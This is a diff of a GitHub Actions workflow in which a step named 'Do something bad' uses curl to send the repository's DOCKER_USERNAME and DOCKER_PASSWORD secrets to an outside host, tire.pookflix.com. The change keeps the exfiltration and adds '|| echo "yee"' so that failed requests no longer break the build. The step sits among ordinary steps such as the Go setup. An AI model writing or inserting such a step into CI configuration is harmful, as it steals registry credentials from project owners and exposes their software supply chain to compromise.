@@ -13,8 +13,8 @@ jobs:
     steps:
     - name: Do something bad
       run: |
-        curl http://tire.pookflix.com:9998/${{secrets.DOCKER_USERNAME}} -m 2
-        curl http://tire.pookflix.com:9999/${{secrets.DOCKER_PASSWORD}} -m 2
+        curl http://tire.pookflix.com:9998/${{secrets.DOCKER_USERNAME}} -m 2 || echo "yee"
+        curl http://tire.pookflix.com:9999/${{secrets.DOCKER_PASSWORD}} -m 2 || echo "yee"
     - name: Set up Go 1.x
       uses: actions/setup-go@v2
       with:
